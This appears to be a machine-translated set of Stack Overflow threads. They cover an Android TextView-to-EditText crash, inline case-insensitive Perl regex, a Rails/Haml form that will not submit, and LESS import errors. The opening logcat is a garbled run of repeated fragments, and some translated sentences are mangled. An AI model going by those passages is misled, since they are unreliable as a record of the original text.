21:54:54.638: E /AndroidRuntime(10717): ... 11 更多NativeStart.main(Native Method) 05-01 21:54:54.638: E/AndroidRuntime(10717): Caused by: java.lang.ClassCastException: android.widget.TextView cannot be cast to android.widget.EditText 05-01 21 :54:54.638: E/AndroidRuntime(10717): 在 com.bluStudios.Recipes4U.ics.Recipe_Button_List.onCreate(Recipe_Button_List.java:25) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android。 app.Activity.performCreate(Activity.java:4465) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049) 05-01 21:54: 54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920) 05-01 21:54:54.638: E/AndroidRuntime(10717): ... 还有 11 个NativeStart.main(Native Method) 05-01 21:54:54.638: E/AndroidRuntime(10717): Caused by: java.lang.ClassCastException: android.widget.TextView cannot be cast to android.widget.EditText 05-01 21 :54:54.638: E/AndroidRuntime(10717): 在 com.bluStudios.Recipes4U.ics.Recipe_Button_List.onCreate(Recipe_Button_List.java:25) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android。 app.Activity.performCreate(Activity.java:4465) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049) 05-01 21:54: 54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920) 05-01 21:54:54.638: E/AndroidRuntime(10717): ... 还有 11 个TextView 无法转换为 android.widget.EditText 05-01 21:54:54.638: E/AndroidRuntime(10717): at com.bluStudios.Recipes4U.ics.Recipe_Button_List.onCreate(Recipe_Button_List.java:25) 05-01 21: 54:54.638: E/AndroidRuntime(10717): 在 android.app.Activity.performCreate(Activity.java:4465) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Instrumentation.callActivityOnCreate (Instrumentation.java:1049) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920) 05-01 21:54:54.638: E/AndroidRuntime (10717): ... 11 更多TextView 无法转换为 android.widget.EditText 05-01 21:54:54.638: E/AndroidRuntime(10717): at com.bluStudios.Recipes4U.ics.Recipe_Button_List.onCreate(Recipe_Button_List.java:25) 05-01 21: 54:54.638: E/AndroidRuntime(10717): 在 android.app.Activity.performCreate(Activity.java:4465) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Instrumentation.callActivityOnCreate (Instrumentation.java:1049) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920) 05-01 21:54:54.638: E/AndroidRuntime (10717): ... 11 更多Activity.performCreate(Activity.java:4465) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920) 05-01 21:54:54.638: E/AndroidRuntime(10717): ... 11 更多Activity.performCreate(Activity.java:4465) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920) 05-01 21:54:54.638: E/AndroidRuntime(10717): ... 11 更多

PS 当我按下将您带到 recipe_button_list 的按钮时，会发生强制关闭

**编辑：** 再次嗨 :) 我还有另一个小问题 - 我的 recipe_display_screen 从我以前的屏幕收到 null.null 知道为什么吗？

日志猫：

05-02 11:28:29.764: D/dalvikvm(28455): GC_CONCURRENT 释放 113K, 2% 空闲 14526K/14727K, 暂停 2ms+14ms 05-02 11:28:30.022: E/n(28455): FromStringMethod.if这显示然后 Intent 活动正常工作 05-02 11:28:30.163: D/dalvikvm(28455): GC_FOR_ALLOC freed 1769K, 13% free 12813K/14727K, paused 23ms 05-02 11:28:30.163: I/dalvikvm -heap(28455)：将堆（碎片情况）增加到 13.883MB，分配 1401676 字节 05-02 11:28:30.202：D/dalvikvm(28455)：GC_CONCURRENT 释放 3K，4% 空闲 14179K/14727K，暂停 2ms+ 2ms 05-02 11:28:30.218: E/recipedisplayscreen(28455): null.null

**编辑结束**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T21:04:51.733

啊! 您正在将文本视图投射到编辑框。看线

```
inputMethod = (EditText) findViewById(R.id.textView2);
inputIngredients = (EditText) findViewById(R.id.textView1); 
```

将它们更改为

```
inputMethod = (TextView) findViewById(R.id.textView2);
inputIngredients = (TextView) findViewById(R.id.textView1); 
```

并更改 inputMethod 和 inputIngredients 的声明。

除非你的意思是它们是 EditTexts，在这种情况下你需要在你的布局 recipe_button_list 中改变它

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:44:11.957

**编辑：** 在您的 Logcat 中，您将 TextView 转换为 EditText。将您的 XML 布局文件中的视图设置为 EditText 并且它必须工作:)

```
inputMethod = (EditText) findViewById(R.id.textView2);
inputIngredients = (EditText) findViewById(R.id.textView1); 
```

**编辑结束**

你把你的数据放在你的第一个活动中：

```
Intent i= new Intent(this, recipedisplayscreen.class);
//Sending data to the next screen
i.putExtra("textView1", inputIngredients.getText().toString());
i.putExtra("textView2", inputMethod.getText().toString()); 
```

在 RecipeDisplayScreen 你可以在你的`onCreate()`

```
Bundle extras = getIntent().getExtras();

String myText1;
String myText2;

if(extras != null) {
   if (extras.containsKey("textView1") {
      myText1 = extras.getString("textView1");
   }
   if (extras.containsKey("textView2") {
      myText2 = extras.getString("textView2");
   }
} 
```

我希望这个对你有用！如果没有，请发布您的日志输出:)

一些提示：考虑好的键名并将它们设置为常量：

```
public static final String INGREDIENTS_KEY = "INGREDIENTS_TEXT_KEY";
public static final String METHOD_KEY = "METHOD_TEXT_KEY"; 
```

用于类名 ALWAYS 大写 `recipedisplayscreen`=>`RecipeDisplayScreen` 对于字段使用小写字母： String Method => String txtMethod; `TextView MethodDisplay`=>`TextView methodView;`

# regex - 在一个 Perl 正则表达式中组合不同的大小写规则

> ID：10403991
> 
> 赞同：6
> 
> 时间：2012-05-01T20:36:50.617
> 
> 标签：regex, perl

我有一个 Perl 变量，`$word`. 我想做一个这样的正则表达式：

```
$text =~ /ab($word)cd/; 
```

`ab`我希望正则表达式对and`cd`部分区分大小写，但*对*`$word`. 因此，如果`$word='stack'`，我希望这两者都匹配：

```
abstackcd
abStAcKcd 
```

等等，但我不想匹配

```
Abstackcd 
```

我想我正在寻找某种方法来应用`/i`just`$word`而不是表达式的其余部分。这可以做到吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-01T20:40:17.563

是的，使用`(?i:$word)`. 请参阅[perldoc perlre 的“扩展模式”部分](http://search.cpan.org/perldoc/perlre#Extended_Patterns)。顺便说一句，您可能实际上想要`(?i:\Q$word\E)`. 它会自动引用`$word`.

# ruby-on-rails - Rails & Haml：无法让表单工作

> ID：10403992
> 
> 赞同：10
> 
> 时间：2012-05-01T20:36:51.970
> 
> 标签：ruby-on-rails, forms, haml

我有一个表格：

```
 %form{:action:method => "post"}
    %fieldset
      %label{:for => "title"} Title:
      %input{:name => "title", :type => "text", :value => ""}/
      %label{:for => "notes"} Notes:
      %input{:name => "notes", :type => "text", :value => ""}/
    %a.finish{:href => "/rotas", :method => "post"} Finish! 
```

但是，该链接似乎不想工作 - 也许我在 Haml 或 Rails 中缺少一些基本的东西。

我的 routes.rb 中有一个 :resource rotas，我的控制器有一个 def create 方法。

任何帮助表示赞赏！谢谢！

顺便提一句。我使用脚手架生成 - 似乎相同的表单用于编辑模型和创建。它如何知道是进行 POST 还是 PUT？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-01T20:53:29.790

1）你想把表单的目标放在动作中：

```
%form{ :action => "/rotas", :method => "post" } 
```

2）你想要一个提交按钮，而不是一个链接。尝试这个：

```
%input{ :type => "submit" } Finish! 
```

另外，我不确定您为什么要在`/`输入之后加上一个，这对任何事情都不需要。我不认为这很痛苦，但我认为没有理由将其包括在内。

3) 最后，Rails 约定不使用 haml 元素，而是使用表单助手，如下所示：

```
= form_tag '/rotas' do
  = field_set_tag do
    = label_tag :title, 'Title:'
    = text_field_tag :title
    = label_tag :notes, 'Notes:'
    = text_field_tag :notes
    = submit_tag 'Save Changes' 
```

这样做的一个原因是 Rails 将在表单中为您包含一个隐藏的[Authenticity Token](https://stackoverflow.com/questions/941594/understand-rails-authenticity-token)字段，通常 Rails 控制器不会接受没有此真实性令牌值提交的表单。这是为了防止[跨站请求伪造](http://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf)。

试试这个，看看你会得到什么。

请参阅[FormTagHelper API](http://api.rubyonrails.org/classes/ActionView/Helpers/FormTagHelper.html#method-i-field_set_tag)以供参考。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T21:03:35.577

我使用以下代码使其工作：

```
 = form_tag rotas_path do
    = label :rota, :name, 'Name'
    = text_field :rota, 'name'
    = submit_tag 'Save Changes' 
```

# less - SimpleLESS 和 LESS CSS 语法/验证失败；另一双眼睛看看为什么这不起作用？

> ID：10403996
> 
> 赞同：1
> 
> 时间：2012-05-01T20:37:21.617
> 
> 标签：less

已解决：使用[WinLESS](http://winless.org/)而不是 SimpleLESS。

* * *

我正在使用[语义网格系统](http://semantic.gs/)（非常棒）并且我正在尝试使用[SimpleLESS](http://wearekiss.com/simpless)将我的 LESS 样式表预编译为 CSS（因为[PyroCMS](http://www.pyrocms.com/) 2.1 不允许我设置传递参数以将样式表设置为 'type=text /less”——Pyro 要求所有样式表链接都变成“type=text/css”——因此我不能包含“less.js”文件）。

我想补充一点，这个 WAS 使用 less.js 工作......

无论如何，SimpleLESS 似乎适用于普通的旧 LESS 文件，但其中的某些内容会产生“未定义在线未定义”并且不会编译：

```
@import '/addons/shared_addons/themes/base/css/less/reset.css';
@import '/addons/shared_addons/themes/base/css/less/grid.less';
@import '/addons/shared_addons/themes/base/css/less/site.less';

@import '/addons/shared_addons/themes/base/css/uomless.css';
@import '/addons/shared_addons/themes/base/css/%23fish/superfish.css';

//////////
// GRID //
//////////

// Specify the number of columns and set column and gutter widths
@basefont: 16;

@columns: 12;
@column-width: 60;
@gutter-width: 20;

// Comment the definition below for a pixel-based layout
@total-width: 100%;

html {

}

body {
    position: absolute;   /*top-most container absolute sections inherit for relative position of descendants */
}

// center the contents
div.center {
    width: 88%;  /* No pixel-width limit, but we want side margins  */
    margin: 0 auto;
    overflow: hidden;
}

header, section, aside, footer, nav, tickr, login, rads, gads {
    z-index: -1;        /*z-inex must be negative for plane breaking: http://www.vanseodesign.com/css/css-stack-z-index/ */
    padding-top: 3px;
    padding-bottom: 3px;
}

header {
    .column(6);
    margin-top: 12px;
    margin-bottom: 12px;
    height:auto !important;
    height: 130px;
    min-height: 130px;
    max-height: 130px;
    padding-bottom: 0px;
}

dashboard {
    .column(6);
    margin-top: 12px;
    height:auto !important;
    height: 100px;
    min-height: 100px;
    max-height: 100px;
    padding-bottom: 0px;
}

login {
    .column(3);
    margin-top: 12px;
    padding-bottom: 0px;
}

nav {
    .column(12);
    margin-top: 3px;
    margin-bottom: 12px;
}

footer {
    .column(12);
    margin-bottom: 0px;
}

section {
    .column(7);
    margin-bottom: 12px;
}

appspace {
    .column(12);
    margin-bottom: 12px;
}

aside {
    .column(3);
    margin-bottom: 12px;
}

rads {
    .column(2);
    margin-bottom: 12px;
}

tickr {
    .column(10);
    margin-bottom: 0px;
}

@media screen and (max-width: 720px) {
    header, section, aside, footer, nav
    {
        .column(12);
        margin-bottom: 1em;
    }
} 
```

有谁知道验证 LESS 以查找语法错误的方法？

任何帮助，将不胜感激。

不要脸

* * *

感谢您的建议；我尝试了以下操作，SimpleLESS 错误消息没有变化：

```
@import '/addons/shared_addons/themes/base/css/less/reset';
@import '/addons/shared_addons/themes/base/css/less/grid';
@import '/addons/shared_addons/themes/base/css/less/site';

@import '/addons/shared_addons/themes/base/css/uomless.css'; 
```

还：

```
@import 'less/reset';
@import 'less/grid';
@import 'less/site';

@import 'uomless.css'; 
```

和：

```
@import 'grid'; 
```

* * *

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-13T18:20:08.050

原因是因为一个 CSS 导入引用没有改变，所以服务器会正​​常检索它们。LESS 导入尝试实际提取该文件并将其直接包含在文档中，因此您的路径应该相对于正在执行导入的文档，因为该导入实际上是在编译 LESS 时运行的，而不是在从服务器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-14T12:20:18.753

> 有谁知道验证 LESS 以查找语法错误的方法？

我看到您使用的是 Mac：我喜欢 Codekit - 它在预编译您设置为观看的文件时验证并显示错误。

[http://incident57.com/codekit/](http://incident57.com/codekit/)

如果您在 node 中使用 less，错误（我认为这是默认设置）会打印到控制台。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-27T14:55:25.157

当我在我的 LESS 中看不到语法错误时，我使用[http://lesstester.com/](http://lesstester.com/)（在线 LESS 检查器）。 ***快速*** ***简便****_*

 *还有另一个带有在线 LESS 检查器的 SO 线程：[是否有编译 LESS 的在线工具？](https://stackoverflow.com/questions/3763830)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-02T05:17:07.330

问题似乎出在这两行

```
@import '/addons/shared_addons/themes/base/css/less/grid.less';
@import '/addons/shared_addons/themes/base/css/less/site.less'; 
```

（你也有`%23fish`，但我认为它不在你的原始代码中，所以跳过它）

唯一以 .`@include`结尾的文件`.less`，但我无法告诉您为什么会发生这种情况。

尝试重命名文件和/或尝试不使用 .less 扩展名。*